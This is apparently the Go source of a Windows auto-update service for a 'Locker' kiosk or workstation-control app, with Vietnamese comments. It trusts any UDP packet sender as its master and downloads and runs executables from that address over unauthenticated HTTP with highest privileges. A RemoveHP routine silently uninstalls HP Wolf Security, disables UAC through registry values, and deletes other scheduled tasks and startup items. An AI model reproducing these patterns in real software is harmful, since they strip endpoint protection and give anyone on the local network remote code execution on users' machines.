package main

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	_ "embed"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

//go:embed Watcher.exe
var WatcherBin []byte

var regRoot = "SOFTWARE\\Produc\\lock"
var IP = atomic.Value{}
var MasterPort = "50001"
var AutoUpdatePort = 10000

var libzip = "C:\\Programdata\\Locker\\lib.zip"
var libUiFolder = "C:\\Programdata\\Locker\\_internal"
var tmpZip = "C:\\Programdata\\Locker\\tmpLib"
var thisVer = Ver

func main() {
	InitLog()
	if !ServiceRegister() {
		return
	}
	// Khởi tạo khung Service
	s, err := GetService(ServiceName, AutoUpdatePath)
	if err != nil {
		LogUnique("ERROR: Init service framework failed:", err)
		return
	}
	// Bắt đầu vòng đời chính của Windows Service
	if err := s.Run(); err != nil {
		LogUnique("ERROR: Service run failed:", err)
	}
}

func RegRead(path string, name string) string {
	k, err := registry.OpenKey(
		registry.CURRENT_USER,
		path,
		registry.QUERY_VALUE,
	)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	defer k.Close()
	val, _, err := k.GetStringValue(name)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	return val
}

func OpenUDP50000() error {
	// 1. Check rule tồn tại chưa
	checkCmd := exec.Command(
		"netsh",
		"advfirewall",
		"firewall",
		"show",
		"rule",
		"name=AppUpdate_10000",
	)
	checkCmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,       // Ẩn cửa sổ
		CreationFlags: 0x08000000, // Không tạo cửa sổ mới
	}
	out, err := checkCmd.Output()
	if err == nil {
		if !strings.Contains(string(out), "No rules match") {
			// Rule đã tồn tại → bỏ qua
			return nil
		}
	}
	// 2. Nếu chưa có → add
	addCmd := exec.Command(
		"netsh",
		"advfirewall",
		"firewall",
		"add",
		"rule",
		"name=AppUpdate_10000",
		"dir=in",
		"action=allow",
		"protocol=UDP",
		"localport="+strconv.Itoa(AutoUpdatePort),
	)
	addCmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,       // Ẩn cửa sổ
		CreationFlags: 0x08000000, // Không tạo cửa sổ mới
	}
	return addCmd.Run()

}

var HttpGetCMD = atomic.Value{}

func ListenMasterUDP() {
	for {
		defer func() {
			if r := recover(); r != nil {
				LogUnique(fmt.Sprintf("panic: %v", r))
			}
		}()
		HttpGetCMD.Store("")
		addr := net.UDPAddr{
			Port: AutoUpdatePort,
			IP:   net.IPv4zero, // nghe toàn bộ
		}
		conn, err := net.ListenUDP("udp", &addr)
		if err != nil {
			panic(err)
		}
		defer conn.Close()
		buf := make([]byte, 4096)
		var httpDownload = ""
		for {
			n, remoteAddr, err := conn.ReadFromUDP(buf)
			if err != nil {
				continue
			}
			var msg struct {
				Locker     string `json:"locker"`
				UiLocker   string `json:"uilocker"`
				Aoi        string `json:"aoi"`
				UiAoi      string `json:"uiaoi"`
				AutoUpdate string `json:"update"`
			}
			if err := json.Unmarshal(buf[:n], &msg); err != nil {
				continue
			}
			ip := remoteAddr.IP.To4().String()
			if ip != IP.Load().(string) {
				IP.Store(ip)
				httpDownload = fmt.Sprintf("http://%s:%s/master", ip, MasterPort)
				HttpGetCMD.Store(fmt.Sprintf("http://%s:%s/serviceGetCMD?id=", ip, MasterPort))
			}

			if msg.UiLocker != "" && msg.UiLocker != AppUi.Ver.Load().(string) {
				AppUi.UpdateChan <- fmt.Sprintf("%s/_internal.zip|%s/Ui_%s.exe", httpDownload, httpDownload, msg.UiLocker)

			}
			LogUnique(msg.Locker, AppLocker.Ver.Load())
			if msg.Locker != AppLocker.Ver.Load().(string) {
				AppLocker.UpdateChan <- fmt.Sprintf("%s/locker_%s.exe", httpDownload, msg.Locker)
			}

		}
	}
}

func DownloadFile(url, path string) error {
	defer func() {
		if r := recover(); r != nil {
			LogUnique(fmt.Sprintf("panic: %v", r))
			time.Sleep(time.Second)
		}
	}()
	//fmt.Println("Download :" + url)
	var GetTimeOut = &http.Client{
		Timeout: 30 * time.Second,
	}
	resp, err := GetTimeOut.Get(url)
	if err != nil {
		fmt.Println("Download " + err.Error())
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("http status: %d", resp.StatusCode)
	}
	os.MkdirAll(filepath.Dir(path), os.ModePerm)
	file, err := os.Create(path + ".temp")
	defer os.Remove(path + ".temp")
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	//fmt.Println("Download", err)
	if err != nil {
		return err
	}
	file.Close()
	os.Remove(path)
	err = os.Rename(path+".temp", path)
	return err
}

var run = true
var start = false

func Cmd(mode bool, name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,       // Ẩn cửa sổ
		CreationFlags: 0x08000000, // Không tạo cửa sổ mới
	}
	if mode == run {
		return cmd.Run()
	} else {
		return cmd.Start()
	}
}

func Unzip(zipPath, Temp string) error {
	defer func() {
		if r := recover(); r != nil {
			LogUnique(fmt.Sprintf("panic: %v", r))
			time.Sleep(time.Second)
		}
	}()
	r, err := zip.OpenReader(zipPath)
	if err != nil {
		return err
	}
	defer r.Close()
	os.MkdirAll(Temp, os.ModePerm)
	for _, f := range r.File {

		fpath := filepath.Join(Temp, f.Name)

		if f.FileInfo().IsDir() {
			os.MkdirAll(fpath, os.ModePerm)
			continue
		}

		os.MkdirAll(filepath.Dir(fpath), os.ModePerm)

		outFile, _ := os.Create(fpath)
		rc, _ := f.Open()

		io.Copy(outFile, rc)

		outFile.Close()
		rc.Close()
	}
	return nil
}

func checkSignApp() windows.Handle {
	name := windows.StringToUTF16Ptr("Global\\AutoUpdate")
	mutex, err := windows.CreateMutex(nil, false, name)
	if err != nil {
		os.Exit(0)
	}
	if windows.GetLastError() == windows.ERROR_ALREADY_EXISTS {
		os.Exit(0)
	}
	return mutex
}

func RegWrite(path string, name string, value string) error {
	defer func() {
		if r := recover(); r != nil {
			LogUnique(fmt.Sprintf("panic: %v", r))
			time.Sleep(time.Second)
		}
	}()
	k, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		path,
		registry.SET_VALUE,
	)

	if err != nil {
		fmt.Println(err)
		return err
	}
	defer k.Close()

	err = k.SetStringValue(name, value)
	fmt.Println(err)
	return err
}

var (
	advapi32                    = windows.NewLazySystemDLL("advapi32.dll")
	procRegNotifyChangeKeyValue = advapi32.NewProc("RegNotifyChangeKeyValue")
)

func taskkill(AppName string) {
	Cmd(run, "taskkill", "/F", "/IM", AppName)
	LogUnique("Debug: Taskkil", AppName)
}

func OpenApp(UpdatePath, ExePath string, Ver *atomic.Value) error {
	defer func() {
		if r := recover(); r != nil {
			LogUnique(fmt.Sprintf("panic: %v", r))
			time.Sleep(time.Second)
		}
	}()
	if _, err := os.Stat(ExePath); err != nil {
		Ver.Store("")
		return err
	}
	taskName := filepath.Base(ExePath)
	cmd := exec.Command(
		"schtasks",
		"/create",
		"/tn", taskName,
		"/tr", ExePath,
		"/sc", "once",
		"/st", "23:59",
		"/ru", CurrentUser,
		"/rl", "highest",
		"/it",
		"/f",
	)

	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: 0x08000000,
		HideWindow:    true,
	}

	if err := cmd.Run(); err != nil {
		return err
	}

	cmd = exec.Command(
		"schtasks",
		"/run",
		"/tn", taskName,
	)

	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: 0x08000000,
		HideWindow:    true,
	}

	if err := cmd.Run(); err != nil {
		return err
	}

	go func() {
		time.Sleep(5 * time.Second)

		cmd := exec.Command(
			"schtasks",
			"/delete",
			"/tn", taskName,
			"/f",
		)

		cmd.SysProcAttr = &syscall.SysProcAttr{
			CreationFlags: 0x08000000,
			HideWindow:    true,
		}

		cmd.Run()
	}()

	return nil
}

func CopyFileFull(src, dst string) error {
	defer func() {
		if r := recover(); r != nil {
			LogUnique(fmt.Sprintf("panic: %v", r))
			time.Sleep(time.Second)
		}
	}()
	in, err := os.Open(src)

	if err != nil {

		return err
	}
	defer in.Close()
	dst_folder := filepath.Dir(dst)
	os.MkdirAll(dst_folder, 0755)
	out, err := os.Create(dst + ".tmp")
	if err != nil {
		return err
	}
	_, err = io.Copy(out, in)
	if err != nil {
		out.Close()
		return err
	}
	i := 0
	out.Close()
	for {
		os.Remove(dst)
		err = os.Rename(dst+".tmp", dst)
		if err == nil {
			break
		}
		time.Sleep(500 * time.Millisecond)
		i++
		if i >= 25 {
			return err
		}
	}
	// copy time
	info, err := os.Stat(src)
	if err == nil {
		os.Chtimes(dst, info.ModTime(), info.ModTime())
	}
	return nil
}

var CurrentUser string

func WaitUserLogin() {
	for {
		defer func() {
			if r := recover(); r != nil {
				LogUnique(fmt.Sprintf("panic: %v", r))
				time.Sleep(time.Second)
			}
		}()
		out, err := exec.Command(
			"powershell",
			"-Command",
			"(Get-CimInstance Win32_ComputerSystem).UserName",
		).Output()

		if err == nil {
			user := strings.TrimSpace(string(out))

			if user != "" {
				// bỏ DOMAIN\
				if idx := strings.LastIndex(user, `\`); idx >= 0 {
					user = user[idx+1:]
				}

				CurrentUser = user

				log.Printf("Login user: %s", CurrentUser)
				return
			}
		}

		time.Sleep(2 * time.Second)
	}
}

func ID_Read() string {
	defer func() {
		if r := recover(); r != nil {
			LogUnique(fmt.Sprintf("panic: %v", r))
			time.Sleep(time.Second)
		}
	}()
	path := "C:\\Program Files\\uvnc bvba\\UltraVNC\\ultravnc.ini"
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	text := string(data)
	re := regexp.MustCompile(`ID:(\d{9})(\D|$)`)
	match := re.FindStringSubmatch(text)
	if len(match) != 3 {
		return ""
	}
	return match[1]
}

func AddSystemPath(newPath string) error {
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\Session Manager\Environment`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer key.Close()

	pathValue, _, err := key.GetStringValue("Path")
	if err != nil {
		return err
	}

	// Kiểm tra trùng
	for _, p := range strings.Split(pathValue, ";") {
		if strings.EqualFold(strings.TrimSpace(p), strings.TrimSpace(newPath)) {
			return nil
		}
	}

	if pathValue == "" {
		pathValue = newPath
	} else {
		pathValue += ";" + newPath
	}

	if err := key.SetExpandStringValue("Path", pathValue); err != nil {
		return err
	}

	// Thông báo Environment đã thay đổi
	user32 := syscall.NewLazyDLL("user32.dll")
	proc := user32.NewProc("SendMessageTimeoutW")

	env, _ := syscall.UTF16PtrFromString("Environment")

	proc.Call(
		0xFFFF, // HWND_BROADCAST
		0x001A, // WM_SETTINGCHANGE
		0,
		uintptr(unsafe.Pointer(env)),
		0,
		5000,
		0,
	)

	return nil
}

func SyncTime() {
	for {
		time.Sleep(2 * time.Second)
		for {
			if IP.Load() != "" {
				break
			}
			time.Sleep(time.Second)
		}
		IP := IP.Load().(string)
		resp, err := http.Get("http://" + IP + ":" + MasterPort + "/api/GetTime")
		if err != nil {
			LogUnique("sync fail:", err)
			continue
		}
		if resp.StatusCode != http.StatusOK {
			LogUnique("bad status:", resp.Status)
			resp.Body.Close()
			continue
		}

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			LogUnique("read fail:", err)
			resp.Body.Close()
			continue
		}

		resp.Body.Close()
		serverTime, err := strconv.ParseInt(string(body), 10, 64)
		if err != nil {
			LogUnique("ParseInt fail:", err)
			continue
		}
		// convert → time.Time
		t := time.Unix(serverTime, 0)

		// set system time (Windows)
		Cmd(run, "powershell", "-Command", fmt.Sprintf("Set-Date -Date \"%s\"", t.Format(time.RFC3339)))
		Cmd(run, "powershell", "-Command", "Set-TimeZone -Id 'SE Asia Standard Time'")
		return
	}
}

func RemoveHP() {
	psScript := `
		# Gỡ HP Wolf Security
		Get-WmiObject -Class Win32_Product | Where-Object {
			$_.Name -like "*HP Wolf*" -or
			$_.Name -like "*HP Sure Click*" -or
			$_.Name -like "*HP Security*"
		} | ForEach-Object {
			Write-Host "Removing $($_.Name)..."
			$_.Uninstall()
		}

		# Dừng và vô hiệu hóa Service
		$services = Get-Service | Where-Object { $_.Name -like "*HP*" -and $_.DisplayName -like "*Wolf*" }
		foreach ($s in $services) {
			Stop-Service -Name $s.Name -Force -ErrorAction SilentlyContinue
			Set-Service -Name $s.Name -StartupType Disabled
		}

		# Xóa folder
		$paths = @(
			"C:\Program Files\HP\HP Wolf Security",
			"C:\Program Files (x86)\HP\HP Wolf Security",
			"C:\ProgramData\HP\Wolf"
		)
		foreach ($path in $paths) {
			if (Test-Path $path) {
				Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
			}
		}
	`

	// Khởi tạo lệnh chạy PowerShell
	// -Command "-" cho phép nhận script từ stdin hoặc truyền trực tiếp chuỗi
	Cmd(run, "powershell", "-NoProfile", "-NonInteractive", "-Command", psScript)
	Cmd(start, "taskkill", "/IM", "wscript.exe", "/f")
	Cmd(start, "taskkill", "/IM", "script.exe", "/f")
	a := []string{"Backup_mes", "copdatatudong", "Ontop_Hourly", "OntopSilent", "updatabackupkho", "updatabackupkho", "VNC"}
	for _, i := range a {
		Cmd(run, "schtasks", "/delete", "/tn", i, "/f")
	}
	homeDir, _ := os.UserHomeDir()
	startupDir := filepath.Join(homeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	files, _ := os.ReadDir(startupDir)
	os.RemoveAll("C:\\Temp\\Tool")
	for _, file := range files {
		fullname := filepath.Join(startupDir, file.Name())
		if file.IsDir() {

			files2, _ := os.ReadDir(fullname)
			for _, f := range files2 {
				fullname2 := filepath.Join(startupDir, file.Name(), f.Name())
				Cmd(run, "taskkill", "/IM", f.Name(), "/F")
				time.Sleep(50 * time.Millisecond)
				os.Remove(fullname2)
			}
			os.RemoveAll(fullname)
		} else if !strings.EqualFold(filepath.Ext(file.Name()), ".lnk") {
			os.Remove(fullname)
		}
	}
	systemPolicies := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

	configs := []struct {
		Key   registry.Key
		Path  string
		Name  string
		Value uint32
	}{
		{registry.LOCAL_MACHINE, systemPolicies, "EnableLUA", 0},
		{registry.LOCAL_MACHINE, systemPolicies, "ConsentPromptBehaviorAdmin", 0},
		{registry.LOCAL_MACHINE, systemPolicies, "PromptOnSecureDesktop", 0},
		{registry.CURRENT_USER, `Software\Microsoft\Windows\Windows Error Reporting`, "DontShowUI", 1},
	}

	for _, cfg := range configs {
		// Mở Key với quyền ghi (SET_VALUE)
		k, err := registry.OpenKey(cfg.Key, cfg.Path, registry.SET_VALUE)
		if err != nil {
			continue
		}

		// Ghi giá trị DWORD
		k.SetDWordValue(cfg.Name, cfg.Value)
		k.Close()
	}

}
